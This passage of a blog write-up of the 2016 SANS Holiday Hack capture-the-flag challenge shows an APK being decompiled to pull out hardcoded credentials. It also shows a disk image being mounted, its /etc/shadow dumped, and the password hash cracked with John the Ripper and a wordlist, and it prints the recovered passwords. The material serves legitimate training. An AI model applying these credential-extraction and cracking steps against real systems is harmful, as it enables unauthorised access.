PEACEONEARTHJOYELF.......-QWSANTAELFWSANTAWHOHOHOPEACEONEARTHCHRISTMASELFQQ
CHRISTMASSANTAJOYQ........]SANTASANTASANTAGOODWILLTOWARDSMENPEACEONEARTHELF
ELFHOHOHOCHRISTMAS;........?ELFJOYPEACEONEARTHELFQWGOODWILLTOWARDSMENHOHOHO
GOODWILLTOWARDSMEN[.........-&quot;????????????????????4ELFCHRISTMASHOHOHOQQWELF
SANTASANTAJOYSANTAL...............................]HOHOHOQWJOYELFQQWJOYJOYQ
NORTHPOLECHRISTMASQ...............................]NORTHPOLEELFQWJOYJOYELFQ
SANTANORTHPOLEELFQWc..............................]GOODWILLTOWARDSMENSANTAQ
JOYSANTACHRISTMASQQm..............................]ELFNORTHPOLECHRISTMASELF
CHRISTMASSANTASANTAQL.............................]PEACEONEARTHWJOYJOYQQWQQ
ELFNORTHPOLEHOHOHOJOYc............................]SANTACHRISTMASJOYELFJOYQ
SANTAELFHOHOHOJOYJOYQQc...........................]PEACEONEARTHSANTAQQWJOYQ
GOODWILLTOWARDSMENSANTAw,.........................]NORTHPOLEHOHOHONORTHPOLE
NORTHPOLENORTHPOLEQWSANTAa,.......................]PEACEONEARTHWSANTAWJOYQQ
SANTACHRISTMASHOHOHOELFELFQQgwaaaaaaaaaaaaaaaaaaaajCHRISTMASJOYPEACEONEARTH
SANTAHOHOHOPEACEONEARTHSANTAQWWWWWWWWWWWWWWWWWWWWHOHOHOELFJOYCHRISTMASELFQQ
NORTHPOLESANTASANTANORTHPOLESANTAPEACEONEARTHCHRISTMASELFHOHOHOELFJOYWJOYQQ
JOYELFJOYNORTHPOLEPEACEONEARTHJOYGOODWILLTOWARDSMENPEACEONEARTHELFELFELFELF
SANTAJOYCHRISTMASQQWELFWGOODWILLTOWARDSMENSANTANORTHPOLENORTHPOLEJOYWSANTAQ
JOYPEACEONEARTHSANTAGOODWILLTOWARDSMENJOYPEACEONEARTHJOYELFJOYCHRISTMASJOYQ
PEACEONEARTHJOYHOHOHOJOYHOHOHONORTHPOLEHOHOHOGOODWILLTOWARDSMENPEACEONEARTH
SANTASANTAELFJOYQQP???????????????????????????????4PEACEONEARTHJOYQWSANTAQQ
ELFELFHOHOHOHOHOHOf...............................]GOODWILLTOWARDSMENJOYELF
SANTAJOYELFELFELFQf...............................]CHRISTMASNORTHPOLESANTAQ
SANTAHOHOHOELFJOYQf...............................]GOODWILLTOWARDSMENELFELF
GOODWILLTOWARDSMENf...............................]CHRISTMASCHRISTMASJOYQWQ
JOYSANTAELFJOYELFQf...............................]PEACEONEARTHSANTAWHOHOHO
CHRISTMASCHRISTMASf...............................]GOODWILLTOWARDSMENSANTAQ
PEACEONEARTHSANTAQf...............................]HOHOHOHOHOHOJOYWHOHOHOWQ
JOYELFHOHOHOJOYELFf...............................]GOODWILLTOWARDSMENHOHOHO
SANTANORTHPOLEJOYQf...............................]PEACEONEARTHNORTHPOLEELF
HOHOHOGOODWILLTOWARDSMENSANTAWJOYQ&#64;'.............sPEACEONEARTHELFWCHRISTMAS
GOODWILLTOWARDSMENHOHOHOCHRISTMASF............._yWWPEACEONEARTHELFELFJOYWQQ
SANTAGOODWILLTOWARDSMENQQWELFQQ&#64;'.............sQWGOODWILLTOWARDSMENJOYJOYQQ
NORTHPOLECHRISTMASNORTHPOLEQQWF............._yQWELFELFELFSANTASANTAHOHOHOQQ
NORTHPOLECHRISTMASELFQQWELFQ&#64;'.............aWCHRISTMASELFPEACEONEARTHQQWELF
SANTAHOHOHOHOHOHOJOYWSANTAQ?............._yQWPEACEONEARTHCHRISTMASQQWJOYJOY
CHRISTMASSANTACHRISTMASQQ&#64;'.............aJOYNORTHPOLESANTAELFHOHOHOSANTAELF
SANTACHRISTMASNORTHPOLEW?............._yCHRISTMASCHRISTMASCHRISTMASHOHOHOQQ
PEACEONEARTHHOHOHOQWQQD'.............aHOHOHOHOHOHONORTHPOLEHOHOHOELFWHOHOHO
HOHOHOCHRISTMASELFELF!............._mGOODWILLTOWARDSMENCHRISTMASSANTASANTAQ
JOYPEACEONEARTHELFQD'.............aCHRISTMASPEACEONEARTHSANTAHOHOHOWSANTAQQ
NORTHPOLEJOYHOHOHOF..............&quot;????????????????4PEACEONEARTHQQWHOHOHOELF
HOHOHOELFSANTAELFQf...............................]SANTAQWJOYWNORTHPOLEELFQ
HOHOHOPEACEONEARTHf...............................]PEACEONEARTHPEACEONEARTH
JOYPEACEONEARTHELFf...............................]HOHOHOSANTASANTASANTAELF
GOODWILLTOWARDSMENf...............................]PEACEONEARTHNORTHPOLEJOY
NORTHPOLEHOHOHOELFf...............................]HOHOHOCHRISTMASWSANTAELF
ELFSANTACHRISTMASQf...............................]SANTAJOYJOYQWSANTAJOYWQQ
HOHOHONORTHPOLEJOYf...............................]PEACEONEARTHSANTAHOHOHOQ
GOODWILLTOWARDSMENf...............................]CHRISTMASCHRISTMASSANTAQ
PEACEONEARTHELFJOYf...............................]PEACEONEARTHJOYELFQQWJOY
JOYSANTAPEACEONEARTHSANTAWQQWQQWGOODWILLTOWARDSMENCHRISTMASJOYSANTASANTAJOY
ELFNORTHPOLESANTAELFHOHOHOJOYGOODWILLTOWARDSMENNORTHPOLECHRISTMASQWJOYWELFQ
HOHOHOCHRISTMASSANTAJOYCHRISTMASHOHOHOSANTAELFQQWJOYHOHOHOJOYJOYELFJOYELFQQ
CHRISTMASJOYJOYHOHOHOHOHOHOJOYPEACEONEARTHSANTAELFGOODWILLTOWARDSMENELFELFQ
HOHOHOELFHOHOHOJOYNORTHPOLEHOHOHOCHRISTMASQ???????4GOODWILLTOWARDSMENELFELF
NORTHPOLECHRISTMASQQWELFWELFWPEACEONEARTHQQ.......]HOHOHOCHRISTMASQWELFELFQ
JOYJOYGOODWILLTOWARDSMENSANTAELFQWNORTHPOLE.......]PEACEONEARTHCHRISTMASJOY
JOYELFCHRISTMASELFHOHOHOPEACEONEARTHJOYJOYQ.......]GOODWILLTOWARDSMENHOHOHO
NORTHPOLESANTAELFQQWGOODWILLTOWARDSMENELFQQ.......]CHRISTMASCHRISTMASJOYQWQ
HOHOHOSANTAELFNORTHPOLEPEACEONEARTHELFQWELF.......]SANTAHOHOHOELFSANTAELFQQ
HOHOHOSANTAPEACEONEARTHELFWJOYWSANTAQWELFQQ.......]NORTHPOLENORTHPOLEWELFQQ
SANTAHOHOHOELFELFNORTHPOLENORTHPOLEWELFJOYQ.......]GOODWILLTOWARDSMENSANTAQ
GOODWILLTOWARDSMENHOHOHOWGOODWILLTOWARDSMEN.......]SANTASANTAHOHOHOQWHOHOHO
SANTANORTHPOLESANTAWGOODWILLTOWARDSMENELFQQ.......]CHRISTMASPEACEONEARTHJOY
ELFHOHOHONORTHPOLEP????????????????????????.......]CHRISTMASSANTAQQWJOYELFQ
PEACEONEARTHSANTAQf...............................]ELFHOHOHOSANTAELFJOYELFQ
ELFCHRISTMASELFELFf...............................]GOODWILLTOWARDSMENSANTAQ
PEACEONEARTHHOHOHOf...............................]GOODWILLTOWARDSMENJOYJOY
CHRISTMASNORTHPOLEf...............................]HOHOHONORTHPOLEQWJOYELFQ
ELFPEACEONEARTHELFf...............................]GOODWILLTOWARDSMENSANTAQ
JOYJOYELFSANTAELFQf...............................]SANTANORTHPOLEELFSANTAWQ
JOYHOHOHOSANTAJOYQf...............................]PEACEONEARTHNORTHPOLEELF
SANTAELFELFHOHOHOQf...............................]CHRISTMASPEACEONEARTHELF
HOHOHONORTHPOLEELFf...............................]NORTHPOLEHOHOHOJOYWSANTA
PEACEONEARTHELFJOY6aaaaaaaaaaaaaaaaaaaaaaaa.......]PEACEONEARTHHOHOHOSANTAQ
CHRISTMASELFELFJOYQQWWWWWWWWWWWWWWWWWWWWWQQ.......]NORTHPOLENORTHPOLESANTAQ
NORTHPOLECHRISTMASHOHOHONORTHPOLEHOHOHOJOYQ.......]PEACEONEARTHELFQQWHOHOHO
JOYPEACEONEARTHJOYCHRISTMASPEACEONEARTHELFQ.......]NORTHPOLEJOYPEACEONEARTH
NORTHPOLECHRISTMASPEACEONEARTHHOHOHOSANTAQQ.......]PEACEONEARTHCHRISTMASELF
HOHOHOHOHOHONORTHPOLEELFCHRISTMASHOHOHOELFQ.......]HOHOHONORTHPOLEELFSANTAQ
NORTHPOLEJOYHOHOHOQQWPEACEONEARTHCHRISTMASQ.......]ELFHOHOHOELFSANTAJOYQQWQ
ELFJOYJOYJOYNORTHPOLEJOYPEACEONEARTHSANTAQQ.......]CHRISTMASELFELFQQWHOHOHO
SANTASANTACHRISTMASNORTHPOLENORTHPOLEELFJOY.......]PEACEONEARTHPEACEONEARTH
ELFPEACEONEARTHJOYQWJOYJOYSANTAHOHOHOJOYELF.......]GOODWILLTOWARDSMENJOYQWQ
JOYCHRISTMASJOYCHRISTMASJOYWNORTHPOLEJOYJOYaaaaaaajCHRISTMASPEACEONEARTHJOY
PEACEONEARTHCHRISTMASPEACEONEARTHWELFWSANTAWWWWWWCHRISTMASJOYNORTHPOLEJOYQQ
SANTACHRISTMASSANTAELFJOYQWNORTHPOLEELFSANTAELFQQP]NORTHPOLESANTAJOYWJOYWQQ
ELFJOYCHRISTMASNORTHPOLEWPEACEONEARTHNORTHPOLEQ&#64;^.]HOHOHOHOHOHOELFCHRISTMAS
HOHOHOELFSANTASANTAWNORTHPOLENORTHPOLEJOYQWELFP`..]CHRISTMASPEACEONEARTHJOY
CHRISTMASJOYPEACEONEARTHJOYSANTAQWCHRISTMASQ&#64;&quot;....]JOYGOODWILLTOWARDSMENJOY
GOODWILLTOWARDSMENJOYJOYWHOHOHOHOHOHOQQWELFP`.....]GOODWILLTOWARDSMENELFELF
ELFSANTAHOHOHOGOODWILLTOWARDSMENCHRISTMASW&quot;.......]PEACEONEARTHELFQQWELFWQQ
GOODWILLTOWARDSMENNORTHPOLEPEACEONEARTHQP`........]GOODWILLTOWARDSMENSANTAQ
CHRISTMASHOHOHOELFQWJOYWSANTAJOYWELFQQW&quot;..........]GOODWILLTOWARDSMENELFELF
JOYHOHOHOGOODWILLTOWARDSMENHOHOHOELFQP`...........]NORTHPOLENORTHPOLEHOHOHO
PEACEONEARTHGOODWILLTOWARDSMENWJOYQW&quot;.............]HOHOHOHOHOHONORTHPOLEJOY
ELFPEACEONEARTHJOYCHRISTMASHOHOHOQP`..............]PEACEONEARTHSANTAWELFWQQ
NORTHPOLEHOHOHOJOYELFSANTAQQWJOYW!................yPEACEONEARTHCHRISTMASELF
CHRISTMASELFELFJOYP?????????????`...............sPEACEONEARTHJOYJOYSANTAELF
JOYHOHOHOELFHOHOHOf..........................._mWQWNORTHPOLECHRISTMASHOHOHO
GOODWILLTOWARDSMENf..........................jCHRISTMASNORTHPOLESANTAJOYJOY
NORTHPOLEHOHOHOELFf........................_JOYPEACEONEARTHELFJOYJOYWJOYWQQ
GOODWILLTOWARDSMENf......................_yGOODWILLTOWARDSMENCHRISTMASELFQQ
NORTHPOLENORTHPOLEf.....................:GOODWILLTOWARDSMENSANTASANTAELFJOY
ELFNORTHPOLEJOYJOYf......................-9NORTHPOLEPEACEONEARTHCHRISTMASQQ
NORTHPOLEELFSANTAQf........................?WGOODWILLTOWARDSMENHOHOHOSANTAQ
GOODWILLTOWARDSMENf..........................4WJOYPEACEONEARTHHOHOHOWELFWQQ
PEACEONEARTHSANTAQf...........................-$SANTACHRISTMASHOHOHOELFJOYQ
HOHOHOELFJOYJOYJOY6aaaaaaaaaaaaa,...............?WWPEACEONEARTHPEACEONEARTH
JOYELFHOHOHOJOYSANTAWWWWWWWWWWWQQc...............-4NORTHPOLEHOHOHOQWJOYELFQ
NORTHPOLEGOODWILLTOWARDSMENSANTAWWg,..............]GOODWILLTOWARDSMENSANTAQ
NORTHPOLEHOHOHOELFHOHOHOCHRISTMASELFc.............]HOHOHOELFSANTAWCHRISTMAS
PEACEONEARTHJOYJOYNORTHPOLESANTAJOYWWg,...........]GOODWILLTOWARDSMENJOYQWQ
ELFHOHOHOELFHOHOHOCHRISTMASCHRISTMASJOYc..........]HOHOHOJOYELFQWCHRISTMASQ
PEACEONEARTHSANTAJOYWCHRISTMASJOYSANTAWWw,........]PEACEONEARTHHOHOHOELFELF
CHRISTMASJOYPEACEONEARTHSANTAPEACEONEARTHQc.......]PEACEONEARTHSANTAELFQWQQ
NORTHPOLEPEACEONEARTHJOYNORTHPOLEJOYELFQQWWw......]PEACEONEARTHWHOHOHOJOYQQ
GOODWILLTOWARDSMENQWHOHOHOQWNORTHPOLEELFELFQQ/....]PEACEONEARTHNORTHPOLEJOY
ELFGOODWILLTOWARDSMENCHRISTMASJOYWJOYWSANTAJOYg...]SANTASANTAHOHOHOJOYQWJOY
NORTHPOLEPEACEONEARTHGOODWILLTOWARDSMENELFELFQWQ,.]PEACEONEARTHNORTHPOLEJOY
CHRISTMASCHRISTMASJOYSANTAWGOODWILLTOWARDSMENQQWQwjPEACEONEARTHSANTAQWJOYQQ
ELFPEACEONEARTHJOYJOYJOYWSANTAQQWPEACEONEARTHCHRISTMASGOODWILLTOWARDSMENJOY
CHRISTMASJOYJOYJOYQWGOODWILLTOWARDSMENSANTAQQWGOODWILLTOWARDSMENJOYWHOHOHOQ
PEACEONEARTHSANTACHRISTMASSANTAELFELFQQWJOYWGOODWILLTOWARDSMENHOHOHOHOHOHOQ
PEACEONEARTHELFELFSANTAQWJOYNORTHPOLEPEACEONEARTHELFSANTAHOHOHOPEACEONEARTH
NORTHPOLECHRISTMASELFNORTHPOLEELFJOYQWCHRISTMASGOODWILLTOWARDSMENNORTHPOLEQ
JOYJOYSANTAJOYSANTACHRISTMASJOYQWPEACEONEARTHNORTHPOLECHRISTMASJOYHOHOHOELF
JOYPEACEONEARTHELFQWELFWCHRISTMASSANTASANTANORTHPOLEQWPEACEONEARTHJOYWJOYWQ
</pre>
<p>Hope your neck is not stiff, 'cause you need to tilt your head to the right
to see the hidden message: <code>Bug Bounty</code>. It so happens that the password
to the ZIP file is <code>bugbounty</code>. We can now extract the APK file from the
ZIP archive:</p>
<div class="highlight"><pre><span class="nv">$ </span>unzip SantaGram_v4.2.zip
Archive:  SantaGram_v4.2.zip
<span class="o">[</span>SantaGram_v4.2.zip<span class="o">]</span> SantaGram_4.2.apk password: bugbounty
  inflating: SantaGram_4.2.apk
</pre></div>
</div>
<div class="section" id="part-2-awesome-package-konveyance">
<h2>Part 2: Awesome Package Konveyance</h2>
<p>Let's take a look at this APK, then! We can use <a class="reference external" href="https://github.com/skylot/jadx">JADX</a>
to decompile the APK.</p>
<p>Since we're looking for credentials, we can then <code>grep</code> on
<code>username</code>, <code>password</code>, etc., to find what we're looking for:</p>
<div class="highlight"><pre><span class="nv">$ </span>grep --include <span class="s2">&quot;*.java&quot;</span> -Rn password .
./android/support/v4/j/a/c.java:529:        stringBuilder.append<span class="o">(</span><span class="s2">&quot;; password: &quot;</span><span class="o">)</span>.append<span class="o">(</span>k<span class="o">())</span><span class="p">;</span>
./com/northpolewonderland/santagram/Login.java:36:        this.c <span class="o">=</span> <span class="o">(</span>EditText<span class="o">)</span> findViewById<span class="o">(</span>R.id.passwordTxt<span class="o">)</span><span class="p">;</span>
./com/northpolewonderland/santagram/Login.java:104:                                    aVar.b<span class="o">((</span>CharSequence<span class="o">)</span> <span class="s2">&quot;We&#39;ve sent you an email to reset your password!&quot;</span><span class="o">)</span>.a<span class="o">((</span>int<span class="o">)</span> R.string.app_name<span class="o">)</span>.a<span class="o">((</span>CharSequence<span class="o">)</span> <span class="s2">&quot;OK&quot;</span>, null<span class="o">)</span><span class="p">;</span>
./com/northpolewonderland/santagram/SignUp.java:22:    EditText passwordTxt<span class="p">;</span>
./com/northpolewonderland/santagram/SignUp.java:29:        inputMethodManager.hideSoftInputFromWindow<span class="o">(</span>this.passwordTxt.getWindowToken<span class="o">()</span>, 0<span class="o">)</span><span class="p">;</span>
./com/northpolewonderland/santagram/SignUp.java:46:        this.passwordTxt <span class="o">=</span> <span class="o">(</span>EditText<span class="o">)</span> findViewById<span class="o">(</span>R.id.passwordTxt2<span class="o">)</span><span class="p">;</span>
./com/northpolewonderland/santagram/SignUp.java:56:                <span class="k">if</span> <span class="o">(</span>this.a.usernameTxt.getText<span class="o">()</span>.toString<span class="o">()</span>.matches<span class="o">(</span><span class="s2">&quot;&quot;</span><span class="o">)</span> <span class="o">||</span> this.a.passwordTxt.getText<span class="o">()</span>.toString<span class="o">()</span>.matches<span class="o">(</span><span class="s2">&quot;&quot;</span><span class="o">)</span> <span class="o">||</span> this.a.fullnameTxt.getText<span class="o">()</span>.toString<span class="o">()</span>.matches<span class="o">(</span><span class="s2">&quot;&quot;</span><span class="o">))</span> <span class="o">{</span>
./com/northpolewonderland/santagram/SignUp.java:68:                parseUser.setPassword<span class="o">(</span>this.a.passwordTxt.getText<span class="o">()</span>.toString<span class="o">())</span><span class="p">;</span>
<span class="hll">./com/northpolewonderland/santagram/b.java:91:            jSONObject.put<span class="o">(</span><span class="s2">&quot;password&quot;</span>, <span class="s2">&quot;busyreindeer78&quot;</span><span class="o">)</span><span class="p">;</span>
</span>./com/northpolewonderland/santagram/SplashScreen.java:53:            jSONObject.put<span class="o">(</span><span class="s2">&quot;password&quot;</span>, <span class="s2">&quot;busyreindeer78&quot;</span><span class="o">)</span><span class="p">;</span>
./com/parse/ParseRESTUserCommand.java:39:        hashMap.put<span class="o">(</span><span class="s2">&quot;password&quot;</span>, str2<span class="o">)</span><span class="p">;</span>
./com/parse/ParseUser.java:20:    private static final String <span class="nv">KEY_PASSWORD</span> <span class="o">=</span> <span class="s2">&quot;password&quot;</span><span class="p">;</span>
./com/parse/ParseUser.java:252:            throw new IllegalArgumentException<span class="o">(</span><span class="s2">&quot;Must specify a password for the user to log in with&quot;</span><span class="o">)</span><span class="p">;</span>
./com/parse/ParseUser.java:795:                final String <span class="nv">password</span> <span class="o">=</span> currentUser.getPassword<span class="o">()</span><span class="p">;</span>
./com/parse/ParseUser.java:810:                                <span class="k">if</span> <span class="o">(</span>password !<span class="o">=</span> null<span class="o">)</span> <span class="o">{</span>
./com/parse/ParseUser.java:811:                                    currentUser.setPassword<span class="o">(</span>password<span class="o">)</span><span class="p">;</span>
./com/parse/ParseUser.java:998:            throw new ParseException<span class="o">(</span>-1, <span class="s2">&quot;Unable to saveEventually on a ParseUser with dirty password&quot;</span><span class="o">)</span><span class="p">;</span>
</pre></div>
<p>We see that the file <code>./com/northpolewonderland/santagram/b.java</code> is
interesting. If we open it, we'll find our wanted credentials:</p>
<div class="highlight"><pre><span class="c1">// File ./com/northpolewonderland/santagram/b.java, line 87</span>
<span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">a</span><span class="o">(</span><span class="kd">final</span> <span class="n">Context</span> <span class="n">context</span><span class="o">,</span> <span class="n">String</span> <span class="n">str</span><span class="o">)</span> <span class="o">{</span>
    <span class="kd">final</span> <span class="n">JSONObject</span> <span class="n">jSONObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JSONObject</span><span class="o">();</span>
    <span class="k">try</span> <span class="o">{</span>
<span class="hll">        <span class="n">jSONObject</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;username&quot;</span><span class="o">,</span> <span class="s">&quot;guest&quot;</span><span class="o">);</span>
</span><span class="hll">        <span class="n">jSONObject</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;password&quot;</span><span class="o">,</span> <span class="s">&quot;busyreindeer78&quot;</span><span class="o">);</span>
</span>        <span class="n">jSONObject</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;type&quot;</span><span class="o">,</span> <span class="s">&quot;usage&quot;</span><span class="o">);</span>
        <span class="n">jSONObject</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;activity&quot;</span><span class="o">,</span> <span class="n">str</span><span class="o">);</span>
        <span class="n">jSONObject</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;udid&quot;</span><span class="o">,</span> <span class="n">Secure</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">context</span><span class="o">.</span><span class="na">getContentResolver</span><span class="o">(),</span> <span class="s">&quot;android_id&quot;</span><span class="o">));</span>
        <span class="k">new</span> <span class="n">Thread</span><span class="o">(</span><span class="k">new</span> <span class="n">Runnable</span><span class="o">()</span> <span class="o">{</span>
            <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
                <span class="n">b</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="n">context</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">string</span><span class="o">.</span><span class="na">analytics_usage_url</span><span class="o">),</span> <span class="n">jSONObject</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}).</span><span class="na">start</span><span class="o">();</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">Log</span><span class="o">.</span><span class="na">e</span><span class="o">(</span><span class="n">a</span><span class="o">,</span> <span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>The credentials in the APK file are <code>guest/busyreindeer78</code>.</p>
<p>We're then supposed to look at an audio file. To do this, we have to take a
look at the resources of the APK file. To do this, we'll unzip the APK. Indeed,
APK files are just particular ZIP files:</p>
<div class="highlight"><pre><span class="nv">$ </span>unzip -d SantaGram_4.2_unzipped SantaGram_4.2.apk
Archive:  SantaGram_4.2.apk
  inflating: SantaGram_4.2_unzipped/AndroidManifest.xml
  inflating: SantaGram_4.2_unzipped/META-INF/CERT.RSA
  inflating: SantaGram_4.2_unzipped/META-INF/CERT.SF
  inflating: SantaGram_4.2_unzipped/META-INF/MANIFEST.MF
  inflating: SantaGram_4.2_unzipped/assets/tou.html
  inflating: SantaGram_4.2_unzipped/classes.dex
<span class="o">[</span>snip <span class="k">for</span> brievety<span class="o">]</span>
<span class="hll"> extracting: SantaGram_4.2_unzipped/res/raw/discombobulatedaudio1.mp3
</span> extracting: SantaGram_4.2_unzipped/resources.arsc
</pre></div>
<p>The name of the audio file in the SantaGram APK file is
<code>discombobulatedaudio1.mp3</code>.</p>
</div>
<div class="section" id="part-3-a-fresh-baked-holiday-pi">
<h2>Part 3: A Fresh-Baked Holiday Pi</h2>
<p>Despite what we've learned on the SantaGram bug bounty program, we're nowhere
closer to learn where Santa Claus is being held. By roaming the North Pole,
we can see password protected doors:</p>
<img alt="password_protected_door.png" class="align-center" src="/images/sans-christmas-challenge-2016/password_protected_door.png" />
<p>Next to these doors, we can see little terminals. However, in order to interact
with these terminals, we need a little system called a <a class="reference external" href="https://en.wikipedia.org/wiki/Raspberry_Pi">Cranberry Pi</a>.
In a sense, we're in luck because by talking to the elf Wunorse Openslae
(<a class="reference external" href="https://www.youtube.com/watch?v=3PgNPc-iFW8">hey!</a>), we learn that Santa's
sleigh is equiped with a Cranberry Pi, to control the SCADA interface:</p>
<img alt="cranpi_introduction.png" class="align-center" src="/images/sans-christmas-challenge-2016/cranpi_introduction.png" />
<p>Indeed, strewn across the North Pole, we can find pieces of the Cranberry Pi
system:</p>
<ul class="simple">
<li>A Cranberry Pi board</li>
<li>A heat sink (why would you need one in the North Pole in the first place?)</li>
<li>An HDMI cable</li>
<li>An SD card</li>
<li>A power cord</li>
</ul>
<p>We now have a full Cranberry Pi system. The only missing part is given by the
elf Holly Evergreen: a <a class="reference external" href="https://www.northpolewonderland.com/cranbian.img.zip">Cranbian image</a>,
which we can use to boot on our Cranberry Pi.</p>
<p>However, in order to use our CranPi, we need the password to open a user
session. Luckily, <a class="reference external" href="https://pen-testing.sans.org/blog/2016/12/07/mount-a-raspberry-pi-file-system-image">this tutorial</a>
by Josh Wright teaches us how we can mount a Raspberry Pi file system image.
Since Cranberry Pi and Raspberry Pi are basically the same (wake up, sheeple!),
we now know how to mount our Cranbian image:</p>
<div class="highlight"><pre><span class="nv">$ </span>unzip cranbian.img.zip
Archive:  cranbian.img.zip
  inflating: cranbian-jessie.img
<span class="nv">$ </span>/sbin/fdisk -l cranbian-jessie.img

Disque cranbian-jessie.img : 1,3 GiB, 1389363200 octets, 2713600 secteurs
Unités : secteur de <span class="m">1</span> × <span class="nv">512</span> <span class="o">=</span> 512 octets
Taille de secteur <span class="o">(</span>logique / physique<span class="o">)</span> : 512 octets / 512 octets
taille d<span class="s1">&#39;E/S (minimale / optimale) : 512 octets / 512 octets</span>
<span class="s1">Type d&#39;</span>étiquette de disque : dos
Identifiant de disque : 0x5a7089a1

Device               Boot  Start     End Sectors  Size Id Type
cranbian-jessie.img1        <span class="m">8192</span>  <span class="m">137215</span>  <span class="m">129024</span>   63M  c W95 FAT32 <span class="o">(</span>LBA<span class="o">)</span>
cranbian-jessie.img2      <span class="m">137216</span> <span class="m">2713599</span> <span class="m">2576384</span>  1,2G <span class="m">83</span> Linux
<span class="nv">$ </span>mkdir cranbian_img_extracted
<span class="nv">$ </span>sudo mount -v -o <span class="nv">offset</span><span class="o">=</span><span class="k">$((</span><span class="m">512</span><span class="o">*</span><span class="m">137216</span><span class="k">))</span> -t ext4 ./cranbian-jessie.img ./cranbian_img_extracted
mount : /dev/loop0 monté sur ./cranbian_img_extracted.
<span class="nv">$ </span>ls cranbian_img_extracted/
bin  boot  dev  etc  home  lib  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
</pre></div>
<p>We now have access to the Cranbian file system. This means that we can try to
crack passwords in the <code>shadow</code> file.</p>
<div class="highlight"><pre><span class="nv">$ </span>cat cranbian_img_extracted/etc/shadow
root:*:17067:0:99999:7:::
daemon:*:17067:0:99999:7:::
bin:*:17067:0:99999:7:::
sys:*:17067:0:99999:7:::
sync:*:17067:0:99999:7:::
games:*:17067:0:99999:7:::
man:*:17067:0:99999:7:::
lp:*:17067:0:99999:7:::
mail:*:17067:0:99999:7:::
news:*:17067:0:99999:7:::
uucp:*:17067:0:99999:7:::
proxy:*:17067:0:99999:7:::
www-data:*:17067:0:99999:7:::
backup:*:17067:0:99999:7:::
list:*:17067:0:99999:7:::
irc:*:17067:0:99999:7:::
gnats:*:17067:0:99999:7:::
nobody:*:17067:0:99999:7:::
systemd-timesync:*:17067:0:99999:7:::
systemd-network:*:17067:0:99999:7:::
systemd-resolve:*:17067:0:99999:7:::
systemd-bus-proxy:*:17067:0:99999:7:::
messagebus:*:17067:0:99999:7:::
avahi:*:17067:0:99999:7:::
ntp:*:17067:0:99999:7:::
sshd:*:17067:0:99999:7:::
statd:*:17067:0:99999:7:::
<span class="hll">cranpi:<span class="nv">$6$2AXLbEoG$zZlWSwrUSD02cm8ncL6pmaYY</span>/39DUai3OGfnBbDNjtx2G99qKbhnidxinanEhahBINm/2YyjFihxg7tgc343b0:17140:0:99999:7:::
</span></pre></div>
<p>We can do so by using John the Ripper with the <a class="reference external" href="https://github.com/danielmiessler/SecLists/raw/master/Passwords/rockyou.txt.tar.gz">rockyou</a>
dictionary:</p>
<div class="highlight"><pre><span class="nv">$ </span>john --wordlist<span class="o">=</span>./rockyou.txt ./cranbian_img_extracted/etc/shadow
Using default input encoding: UTF-8
Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>sha512crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$6$ </span><span class="o">[</span>SHA512 128/128 AVX 2x<span class="o">])</span>
Will run <span class="m">4</span> OpenMP threads
Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
<span class="hll">yummycookies     <span class="o">(</span>cranpi<span class="o">)</span>
</span>1g 0:00:06:12 DONE <span class="o">(</span>2016-12-24 19:11<span class="o">)</span> 0.002687g/s 1221p/s 1221c/s 1221C/s 03698741..yoatzin
Use the <span class="s2">&quot;--show&quot;</span> option to display all of the cracked passwords reliably
Session completed
</pre></div>
<p>We now have a valid account: <code>cranpi/yummycookies</code>.</p>
<p>We can now interact with every terminal in the North Pole. Every terminal is
basicaly a minimal Linux system on which we have to find some sort of flag,
to use as a passphrase to open the door next to it.</p>
<div class="section" id="elf-house-2">
<h3>Elf House #2</h3>
<pre class="literal-block">
*******************************************************************************
*                                                                             *
*To open the door, find both parts of the passphrase inside the /out.pcap file*
*                                                                             *
*******************************************************************************
</pre>
<p>So, apparently, the passphrase is in two parts, in a network capture file.
Let's take a look at this file:</p>
<div class="highlight"><pre>scratchy@31368df46952:/<span class="nv">$ </span>ls -l /out.pcap
-r-------- <span class="m">1</span> itchy itchy <span class="m">1087929</span> Dec  <span class="m">2</span> 15:05 /out.pcap
scratchy@31368df46952:/<span class="nv">$ </span>cat /out.pcap
cat: /out.pcap: Permission denied
</pre></div>
<p>So, this file belongs to user <code>itchy</code>, and we can't read it. Let's see
what's installed on the system:</p>
<div class="highlight"><pre>scratchy@31368df46952:/<span class="nv">$ </span>cat /var/log/apt/history.log
Start-Date: 2016-11-04  18:30:58
Commandline: apt-get dist-upgrade -y
Upgrade: tzdata:amd64 <span class="o">(</span>2016f-0+deb8u1, 2016h-0+deb8u1<span class="o">)</span>, tar:amd64 <span class="o">(</span>1.27.1-2+b1, 1.27.1-
2+deb8u1<span class="o">)</span>
End-Date: 2016-11-04  18:31:00
Start-Date: 2016-12-01  21:18:39
Commandline: apt-get install -y tcpdump sudo nano vim binutils
Install: nano:amd64 <span class="o">(</span>2.2.6-3<span class="o">)</span>, libssl1.0.0:amd64 <span class="o">(</span>1.0.1t-1+deb8u5, automatic<span class="o">)</span>, tcpdump:
